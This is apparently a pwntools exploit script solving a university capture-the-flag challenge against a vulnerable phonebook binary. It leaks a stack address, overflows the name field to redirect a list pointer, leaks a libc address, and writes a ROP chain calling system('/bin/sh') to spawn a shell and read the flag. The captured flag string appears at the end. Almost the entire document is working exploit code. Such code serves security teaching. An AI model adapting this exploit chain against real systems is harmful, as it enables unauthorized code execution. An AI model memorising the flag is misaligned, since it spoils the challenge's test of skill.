from pwn import *
import string
from sys import argv
import os
import time
import subprocess

context.arch = 'amd64'
context.os = 'linux'
info = log.info
context.log_level = 'debug'

binfile = './vuln'
elf = context.binary = ELF(binfile)


# for debugging
gdbscript = '''
file vuln
b *(main)
b *(phonebook_show+20)
b *(main+358)
'''.format(**locals())
with open("gdbscript", "w") as f:
    f.write(gdbscript)


# start remote
#p = remote('tasks.ws24.softsec.rub.de', 33721)

p=remote("127.0.0.1", 1024)
p2=process('tmux split-window -h docker exec -ti $(docker ps -q -f "ancestor=softsec/yellow-pages") /bin/sh -c \'gdb -x gdbscript -p $(pgrep -n vuln)\'', shell=True)
sleep(1)
#p2.close()


def cyclic_find_bytes(b):
    to_be_found = bytes.fromhex(hex(b)[2:])[::-1]
    return cyclic_find(to_be_found)





# my own phone number is a stack leak
# use name field overflow while editing to craft name that overwrites next pointer to point on the stack
# then use show to leak stack content and obtain libc addr
# finally use next object to write ROP chain on the stack, utilizing libc leak
# we adjust fake entry so that name field is exactly behind the canary, allowing us to write our chain without
# touching the canary

p.recvuntil(b"Your phone number is +")
ret_addr_off = 0x7ffdc21b4318-140727860019920
command_addr = int(p.recvline().decode())
print(hex(command_addr))
ret_addr = command_addr+ret_addr_off

p.recvuntil(b"> ")
p.sendline(b"A") # add phonebook entry
p.recvuntil(b"Phone number: ")
p.sendline(b"+490000000")
p.recvuntil(b"Name: ")
p.sendline(b"A"*46)



p.recvuntil(b"> ")
p.sendline(b"A") # add phonebook entry
p.recvuntil(b"Phone number: ")
p.sendline(b"+490000001")
p.recvuntil(b"Name: ")
p.sendline(b"F"*46)



p.recvuntil(b"> ")
p.sendline(b"E") # edit phonebook entry
p.recvuntil(b"Index: ")
p.sendline(b"1") # entry
p.recvuntil(b"Phone number: ")
p.sendline(b"+490000000")
p.recvuntil(b"Name: ")
p.sendline(cyclic(64)+p64(ret_addr-8-8-32))


p.recvuntil(b"> ")
p.sendline(b"S") # show phonebook entry
p.recvuntil(b"Index: ")
p.sendline(b"1") # entry 2
p.recvuntil(b"Phone number: ")
p.recvuntil(b"Name: ")
___libc_start_main = int.from_bytes(p.recvline()[:6][::-1])
p.recvline()
print(___libc_start_main)



libc_start_off = 0x7f52511f024a-0x7f52511c9000

libc_addr = ___libc_start_main-libc_start_off
libc = ELF("./libc.so.6")
libc.address = libc_addr

rop = ROP(libc)
rop.raw(pack(rop.ret.address))
rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))])

payload = rop.chain()


p.recvuntil(b"> ")
p.sendline(b"E") # edit phonebook entry
p.recvuntil(b"Index: ")
p.sendline(b"1") # entry
p.recvuntil(b"Phone number: ")
p.sendline(b"+490000000")
p.recvuntil(b"Name: ")
p.sendline(payload)


p.recvuntil(b"> ")
p.sendline(b"Q")


p.sendline(b"cat /flag")

p.interactive()


#softsec{iQwffYupqKOaeAVY6L5uwkGQVTyll79lYwSpAx_hY6r893KNj8kodgvX5QUtwo5y}